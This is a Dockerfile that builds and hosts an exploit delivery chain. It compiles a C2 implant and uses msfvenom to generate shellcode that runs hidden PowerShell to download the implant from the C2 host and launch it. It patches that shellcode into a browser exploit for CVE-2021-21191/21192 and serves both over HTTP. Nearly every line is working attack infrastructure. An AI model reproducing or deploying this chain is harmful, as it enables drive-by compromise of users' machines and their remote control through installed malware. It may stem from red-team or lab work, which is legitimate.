# Stage 1: Build implant.exe + generate shellcode + patch exploit.js
# Kali is used because it has both metasploit-framework and mingw-w64 in its native repos
FROM kalilinux/kali-rolling AS builder

ARG C2_HOST_IP

RUN apt-get update && apt-get install -y --no-install-recommends \
    make \
    mingw-w64 \
    metasploit-framework \
    python3 \
    && rm -rf /var/lib/apt/lists/*

# Compile implant.exe with host IP baked in
WORKDIR /opt/c2
COPY c2-server/C2-Server-and-Implant/ ./
RUN make bin/windows/implant.exe C2_HOST_IP=$C2_HOST_IP

# Generate shellcode and patch exploit.js
WORKDIR /opt/exploit
COPY exfil-server/CVE-2021-21191---CVE-2021-21192/ ./

RUN msfvenom \
    -p windows/x64/exec \
    CMD="powershell -w hidden -c \"(New-Object Net.WebClient).DownloadFile('http://${C2_HOST_IP}:8000/implant.exe','C:\\Windows\\Temp\\implant.exe'); Start-Process 'C:\\Windows\\Temp\\implant.exe'\"" \
    -f raw \
    -o /tmp/shellcode.bin

RUN printf '%s\n' \
    'import struct, re' \
    'data = open("/tmp/shellcode.bin", "rb").read()' \
    'r = len(data) % 4' \
    'if r: data += b"\x00" * (4 - r)' \
    'ints = struct.unpack("<" + "I" * (len(data)//4), data)' \
    'arr = "[" + ", ".join(str(i) for i in ints) + "]"' \
    'content = open("/opt/exploit/exploit.js").read()' \
    'patched, n = re.subn(r"^var shellcode = \[.*?\];", "var shellcode = " + arr + ";", content, flags=re.MULTILINE)' \
    'assert n, "shellcode line not found in exploit.js"' \
    'open("/opt/exploit/exploit.js", "w").write(patched)' \
    'print("exploit.js patched with", n, "replacement(s)")' \
    > /tmp/patch.py && python3 /tmp/patch.py

# Stage 2: Exfil + Exploit Server (lean runtime image)
FROM python:3.11-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    nodejs \
    npm \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /opt/exploit

# Copy freshly compiled implant.exe from builder
COPY --from=builder /opt/c2/bin/windows/implant.exe ./

# Copy exploit site with shellcode patched by msfvenom during build
COPY --from=builder /opt/exploit/ ./CVE-2021-21191---CVE-2021-21192/

EXPOSE 8000
EXPOSE 8888

CMD ["/bin/sh", "-c", "cd /opt/exploit/CVE-2021-21191---CVE-2021-21192 && node server.js 8888 & cd /opt/exploit && python3 -m http.server 8000 --bind 0.0.0.0"]
